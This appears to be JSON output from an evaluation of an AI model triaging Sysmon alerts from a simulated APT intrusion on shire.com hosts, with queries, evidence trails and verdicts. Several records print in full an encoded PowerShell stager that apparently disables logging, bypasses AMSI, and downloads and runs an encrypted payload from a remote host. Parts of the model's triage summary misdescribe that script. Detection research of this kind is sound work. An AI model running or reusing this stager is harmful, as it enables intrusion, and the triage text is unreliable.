{\"TimeCreated\": \"2019-05-14T23:16:11.119Z\", \"Computer\": \"HFDC01.shire.com\", \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"EventID\": \"7\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"User\": null}, {\"TimeCreated\": \"2019-05-14T23:16:11.119Z\", \"Computer\": \"HFDC01.shire.com\", \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"EventID\": \"7\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"User\": null}, {\"TimeCreated\": \"2019-05-14T23:16:11.120Z\", \"Computer\": \"HFDC01.shire.com\", \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"EventID\": \"7\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"User\": null}, {\"TimeCreated\": \"2019-05-14T23:16:11.120Z\", \"Computer\": \"HFDC01.shire.com\", \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"EventID\": \"12\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"User\": null}, {\"TimeCreated\": \"2019-05-14T23:16:11.120Z\", \"Computer\": \"HFDC01.shire.com\", \"Chann \u2026[truncated \u2014 ask for fewer columns or rows]\n(Showing the first 20 records; there may be more \u2014 ask a more specific question to narrow it down.)"
      },
      {
        "question": "What were the network connections (destination IP, port, and bytes sent/received) from HFDC01.shire.com between 2019-05-14T23:16:00Z and 2019-05-14T23:17:00Z?",
        "evidence": "Query error (Query failed: unrecognized token: \"'HFDC\"). The request may be ambiguous \u2014 try rephrasing or asking something more specific."
      },
      {
        "question": "Please provide the decoded content of the PowerShell -enc command from the alert on HFDC01.shire.com at 2019-05-14T23:16:10Z.",
        "evidence": "1 record(s):\n[{\"TimeCreated\": \"2019-05-14T23:16:10.695Z\", \"Computer\": \"HFDC01.shire.com\", \"User\": \"NT AUTHORITY\\\\SYSTEM\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANAAzAGUAZgAzAC4ASABFAGEAZABlAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUARgAzAC4ASABlAGEAZABlAHIAcwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUAZgAzAC4AUAByAG8AeAB5AD0AWwBTAFkAUwB0AGUATQAuAE4AZQB0AC4AVwBFAEIAUgBlAHEAdQBlAHMAVABdADoAOgBEAEUARgBhAFUAbAB0AFcAZQBCAFAAUgBPAFgAeQA7ACQANAAzAGUAZgAzAC4AUABSAG8AeAB5AC4AQwBSAGUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwBZAHMAVABlAG0ALgBOAGUAdAAuAEMAcgBlAGQARQBuAHQASQBBAEwAQwBhAGMAaABlAF0AOgA6AEQARQBGAEEAdQBMAHQATgBlAFQAdwBPAFIASwBDAHIARQBEAGUAbgB0AGkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8A \u2026[truncated \u2014 ask for fewer columns or rows]"
      },
      {
        "question": "Show all outbound network connections from HFDC01.shire.com to any external IP addresses between 2019-05-14T23:16:00Z and 2019-05-14T23:17:00Z.",
        "evidence": "1 record(s):\n[{\"TimeCreated\": \"2019-05-14T23:16:09.877Z\", \"Computer\": \"HFDC01.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"IpAddress\": \"172.18.39.106\"}]"
      }
    ],
    "grounding_rounds": 0,
    "grounding_unsupported": [],
    "zero_evidence_rounds": 0
  },
  {
    "model": "gemma4:12b-it-q8_0",
    "dataset": "apt3",
    "rule": "powershell_suspicious_launch_flags",
    "title": "PowerShell Suspicious Launch Flags",
    "timestamp": "2019-05-14T22:32:23.415Z",
    "computer": "HR001.shire.com",
    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANAAzAGUAZgAzAC4ASABFAGEAZABlAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUARgAzAC4ASABlAGEAZABlAHIAcwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUAZgAzAC4AUAByAG8AeAB5AD0AWwBTAFkAUwB0AGUATQAuAE4AZQB0AC4AVwBFAEIAUgBlAHEAdQBlAHMAVABdADoAOgBEAEUARgBhAFUAbAB0AFcAZQBCAFAAUgBPAFgAeQA7ACQANAAzAGUAZgAzAC4AUABSAG8AeAB5AC4AQwBSAGUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwBZAHMAVABlAG0ALgBOAGUAdAAuAEMAcgBlAGQARQBuAHQASQBBAEwAQwBhAGMAaABlAF0AOgA6AEQARQBGAEEAdQBMAHQATgBlAFQAdwBPAFIASwBDAHIARQBEAGUAbgB0AGkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQANAAzAGUAZgAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAGUAbQAuAFQAZQB4AFQALgBFAG4AYwBvAGQAaQBOAEcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAFQAQgBZAHQARQBTACgAJwB+AGsAKgBfAEYAUwBqAHIAOAAlAHgAdwBlAEoANgBoAHwAUABLAC4AZgB7AFUATgBNAEgAdQBkAHAANQB5AG0AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBHAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBuAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AE8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACQAKABbAFQAZQBYAHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAEQAZQAuAEcARQB0AFMAdAByAGkATgBHACgAWwBDAE8ATgB2AGUAcgBUAF0AOgA6AEYAUgBvAG0AQgBBAHMARQA2ADQAUwB0AFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQgB6AEEARABvAEEATAB3AEEAdgBBAEQARQBBAE0AQQBBAHUAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAeABBAEQAQQBBAE4AZwBBAD0AJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQANAAzAEUAZgAzAC4ASABlAEEAZABFAHIAUwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AHoAbwBqADAAdgBDAE0ATwBsAFYAZQByADIARgBJAFMAZgBpAEYAawBSAEMAagBsAHIAOABjAD0AIgApADsAJABEAGEAVABhAD0AJAA0ADMARQBmADMALgBEAE8AdwBuAGwAbwBBAEQARABBAFQAYQAoACQAUwBlAHIAKwAkAFQAKQA7ACQAaQB2AD0AJABEAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABBAD0AJABkAEEAVABBAFsANAAuAC4AJABkAEEAdABBAC4AbABlAE4ARwB0AEgAXQA7AC0AagBvAGkAbgBbAEMASABhAHIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=",
    "event_id": "1",
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "triage": {
      "summary": "A PowerShell command was executed by user SHIRE\\martha on host HR001.shire.com. The command was Base64 encoded and, when decoded, revealed a script that performs administrative privilege checks, initializes a Net.WebClient object with specific settings (EnableSystemCredentials), and attempts to interact with 'news.php'.",
      "technique": "T1059.001",
      "technique_name": "PowerShell",
      "confidence": 0.9,
      "disposition": "malicious_true_positive",
      "reasoning": "The decoded PowerShell script contains multiple indicators of malicious intent: use of Base64 encoding for obfuscation, logic to check for administrative privileges ([Security.Principal.WindowsPrincipal]), and the programmatic creation of a Net.WebClient object to facilitate network communication or file downloads.",
      "scope": {
        "systems": [
          "HR001.shire.com"
        ],
        "users": [
          "SHIRE\\martha"
        ],
        "data": "news.php",
        "timeframe": "2019-05-14T22:32:23Z"
      },
      "escalate": true,
      "escalation_rationale": "The activity involves an obfuscated PowerShell script performing privilege checks and preparing for network communication/file operations, which is consistent with a downloader or stager.",
      "recommended_actions": [
        "Isolate host HR001.shire.com from the network.",
        "Perform a full forensic scan of HR001.shire.com to identify any dropped payloads or persistence mechanisms.",
        "Reset credentials for user SHIRE\\martha.",
        "Check for subsequent network connections or file creations following the PowerShell execution."
      ],
      "queries_run": [
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE CommandLine LIKE '%-enc%' OR CommandLine LIKE '%-EncodedCommand%' LIMIT 20;",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE Image LIKE '%powershell.exe%' AND Computer LIKE 'HR001.shire.com' AND TimeCreated BETWEEN '2019-05-14T22:32:23Z' AND '2019-05-14T22:32:23Z' LIMIT 20;",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE Image LIKE '%powershell.exe%' AND Computer = 'HR001.shire.com' AND TimeCreated = '2019-05-14T22:32:23Z' LIMIT 20",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine, EventID FROM logs WHERE Computer LIKE '%HR001.shire.com%' AND TimeCreated BETWEEN '2019-05-14T22:30:00Z' AND '2019-05-14T22:35:00Z' AND EventID = 4624 LIMIT 20",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE Computer = 'HR001.shire.com' AND TimeCreated = '2019-05-14T22:32:23Z' AND Image LIKE '%powershell.exe%' LIMIT 20;",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE Image LIKE '%powershell.exe%' AND Computer = 'HR001.shire.com' AND TimeCreated BETWEEN '2019-05-14T22:32:20Z' AND '2019-05-14T22:32:30Z' LIMIT 20",
        "SELECT TimeCreated, Computer, Channel, EventID, Image, CommandLine, ParentImage, ParentCommandLine, User FROM logs WHERE Computer = 'HR001.shire.com' AND TimeCreated BETWEEN '2019-05-14T22:30:00Z' AND '2019-05-14T22:35:00Z' AND (ParentImage LIKE '%services.exe%' OR CommandLine LIKE '%sc %' OR CommandLine LIKE '%net start%' OR CommandLine LIKE '%net stop%' OR EventID = 7045) LIMIT 20"
      ]
    },
    "fallback_used": false,
    "fallback_reason": null,
    "ground_truth_verdict": "bad",
    "evidence_trail": [
      {
        "question": "What is the decoded content of the Base64 encoded command line?",
        "evidence": "13 record(s):\n[{\"TimeCreated\": \"2019-05-14T22:32:23.369Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": \"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQ